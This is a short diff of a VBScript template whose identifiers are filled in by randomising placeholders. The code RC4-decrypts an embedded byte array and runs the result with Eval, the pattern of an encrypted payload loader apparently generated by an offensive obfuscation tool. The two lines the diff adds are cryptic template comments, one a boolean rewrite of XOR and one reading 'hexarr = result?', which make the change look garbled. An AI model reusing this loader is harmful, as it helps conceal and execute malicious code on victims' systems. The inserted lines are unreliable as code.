@@ -25,6 +25,7 @@ Function {{symbol_name("RC4")}}(byVal {{symbol_name("bytes")}}, byVal {{symbol_n
         s(i) = t
         t = (s(i) + (s(j) Mod 256)) Mod 256
         {{symbol_name("bytes")}}(p) = {{symbol_name("bytes")}}(p) Xor s(t)
+        {% (NOT(A AND B)) AND (NOT(NOT A AND NOT B)) %}
     Next
     {{symbol_name("RC4")}} = {{symbol_name("bytes")}}
 end Function
@@ -45,6 +46,7 @@ dim {{symbol_name("result")}}
 For i = 0 To UBound({{symbol_name("hexarr")}})
   {{symbol_name("hexarr")}}(i) = Chr({{symbol_name("result")}}(i))
 Next
+{% hexarr = result? %}
 
 {{symbol_name("Code")}} = Join({{symbol_name("hexarr")}}, "")
 Eval({{symbol_name("Code")}})
